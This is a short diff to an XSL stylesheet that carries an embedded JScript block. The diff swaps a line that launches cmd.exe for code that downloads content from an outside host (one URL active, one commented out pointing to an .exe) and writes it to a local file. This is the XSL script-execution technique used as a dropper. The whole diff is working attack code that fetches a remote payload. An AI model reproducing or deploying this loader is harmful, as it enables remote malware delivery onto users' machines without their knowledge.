@@ -3,7 +3,30 @@
 <output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
 <![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+var Source = "https://cybersoc.cf" //"https://c3murk.dev/w64.exe"
+var Target = "a.txt"
+var Object = WScript.CreateObject('MSXML2.XMLHTTP');
+Object.Open('GET', Source, false);
+Object.Send();
+if (Object.Status == 200)
+{
+    // Create the Data Stream
+    var Stream = WScript.CreateObject('ADODB.Stream');
+    // Establish the Stream
+    Stream.Open();
+    Stream.Type = 1; // adTypeBinary
+    Stream.Write(Object.ResponseBody);
+    Stream.Position = 0;
+    // Create an Empty Target File
+    var File = WScript.CreateObject('Scripting.FileSystemObject');
+    if (File.FileExists(Target))
+    {
+        File.DeleteFile(Target);
+    }
+    // Write the Data Stream to the File
+    Stream.SaveToFile(Target, 2); // adSaveCreateOverWrite
+    Stream.Close();
+}
 ]]> 
 </ms:script>
 </stylesheet>
